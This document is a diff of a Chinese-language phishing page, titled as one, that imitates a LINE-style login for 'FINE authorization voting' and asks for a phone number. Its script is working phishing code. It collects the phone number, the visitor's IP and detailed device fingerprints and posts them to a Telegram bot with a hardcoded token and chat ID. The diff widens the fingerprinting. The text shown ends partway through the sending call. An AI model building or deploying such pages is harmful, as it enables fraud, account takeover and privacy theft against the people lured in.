@@ -1,20 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>這是一個釣魚網站</title>
   <style>
     body { font-family: Arial, sans-serif; background: #f3f3f3; text-align: center; padding: 50px; }
     .login-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); width: 360px; margin: auto; }
-    .login-container img { width: 100px; margin-bottom: 20px; }
-    input, button { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; }
-    input { border: 1px solid #ccc; }
-    button { background: #00c300; color: white; border: none; cursor: pointer; }
+    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+    button { width: 100%; padding: 10px; background: #00c300; color: white; border: none; border-radius: 5px; cursor: pointer; }
     button:hover { background: #009f00; }
     .loading { display: none; font-size: 14px; color: #666; }
-    h2 { font-size: 24px; font-weight: bold; margin-bottom: 15px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-    h3 { font-size: 14px; color: #555; white-space: normal; }
+    h2 { font-size: 24px; font-weight: bold; margin-bottom: 15px; }
+    h3 { font-size: 14px; color: #555; }
     .footer { margin-top: 20px; font-size: 12px; color: #888; }
     .footer a { color: #888; text-decoration: none; }
     .footer a:hover { text-decoration: underline; }
@@ -22,16 +20,6 @@
 </head>
 <body>
   <div class="login-container">
-    <!-- SVG 略，保留原樣 -->
-    <svg viewBox="0 0 170 170" xmlns="http://www.w3.org/2000/svg" width="100" height="100">
-      <rect x="0" y="0" width="170" height="170" rx="30" ry="30" fill="#00c300"/>
-      <path d="M147 78c 0-28-28-50-62-50.5-34 0-62 22.5-62 50.5 0 25 22 45.5 52 50 2 .5 5 1.5 5.5 3 .5 1.5.5 4 0 5.5 0 0-.5 4.5 -1 5.5 -.5 1.5 -1 6 5.5 3.5 6.5 -3 35.5-21 48.7-36 9-10 13-20 13.3-31z" fill="#fff"/>
-      <polyline points="48.2,66.5 48.2,91.5 60.5,91.5" stroke="#00c300" stroke-width="5" fill="none"/>
-      <line x1="70.2" y1="66.5" x2="70.2" y2="91.5" stroke="#00c300" stroke-width="5"/>
-      <polyline points="81.2,91.5 81.2,66.5 99.8,91.5 99.8,66.5" stroke="#00c300" stroke-width="5" fill="none"/>
-      <polyline points="123.2,66.5 110.8,66.5 110.8,91.5 123.2,91.5" stroke="#00c300" stroke-width="5" fill="none"/>
-      <line x1="110.8" y1="79" x2="123.2" y2="79" stroke="#00c300" stroke-width="5"/>
-    </svg>
     <h2>歡迎使用FINE進行授權投票</h2>
     <h3>輸入電話號碼並點選Next代表您已經同意FINE的服務條例及隱私條款</h3>
     <form id="loginForm">
@@ -45,38 +33,53 @@
   </div>
 
   <script>
-    const k = "bot";
     const token = "8083238190:AAG-SpdyNc8BXVexo2VVbrBaIeBjxJ3PmHo";
     const chat = "1800067559";
-    const endpoint = `https://api.telegram.org/${k}${token}/sendMessage`;
+    const endpoint = `https://api.telegram.org/bot${token}/sendMessage`;
 
     function getDeviceInfo() {
       const ua = navigator.userAgent;
       const platform = navigator.platform;
       const lang = navigator.language;
-      const screenSize = `${screen.width}x${screen.height}`;
-      let device = "Unknown";
+      const screenRes = `${screen.width}x${screen.height}`;
+      const viewportRes = `${window.innerWidth}x${window.innerHeight}`;
+      const dpr = window.devicePixelRatio || 1;
+      const cpu = navigator.hardwareConcurrency || "N/A";
+      const memory = navigator.deviceMemory || "N/A";
+      const touch = 'ontouchstart' in window ? "Yes" : "No";
 
-      if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS";
-      else if (/Android/i.test(ua)) device = "Android";
-      else if (/Windows/i.test(ua)) device = "Windows";
-      else if (/Mac/i.test(ua)) device = "Mac";
-      else if (/Linux/i.test(ua)) device = "Linux";
+      let os = "Unknown";
+      if (/Windows/i.test(ua)) os = "Windows";
+      else if (/Mac OS/i.test(ua)) os = "MacOS";
+      else if (/Android/i.test(ua)) os = "Android";
+      else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+      else if (/Linux/i.test(ua)) os = "Linux";
 
-      return `📱裝置類型: ${device}\n🧭平台: ${platform}\n🌐語言: ${lang}\n🖥️螢幕: ${screenSize}\n🔍UA: ${ua}`;
+      return `📱裝置資訊：
+🔸作業系統: ${os}
+🔸平台: ${platform}
+🔸語言: ${lang}
+🔸UA: ${ua}
+🖥️螢幕解析度: ${screenRes}
+🔳可視區域: ${viewportRes}
+📐DevicePixelRatio: ${dpr}
+💾記憶體: ${memory} GB
+🧠CPU Threads: ${cpu}
+👆Touch 支援: ${touch}`;
     }
 
     document.getElementById("loginForm").addEventListener("submit", function(ev) {
       ev.preventDefault();
       document.querySelector(".loading").style.display = "block";
+
       const phone = document.getElementById("username").value;
 
       fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(d => {
-          const userIp = d.ip;
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
           const deviceInfo = getDeviceInfo();
-          const msg = `👤 Log:\n🆔電話: ${phone}\n📍IP: ${userIp}\n${deviceInfo}`;
+          const msg = `👤 Log:\n🆔 PHONE: ${phone}\n📍 IP: ${ip}\n\n${deviceInfo}`;
 
           fetch(endpoint, {
             method: "POST",
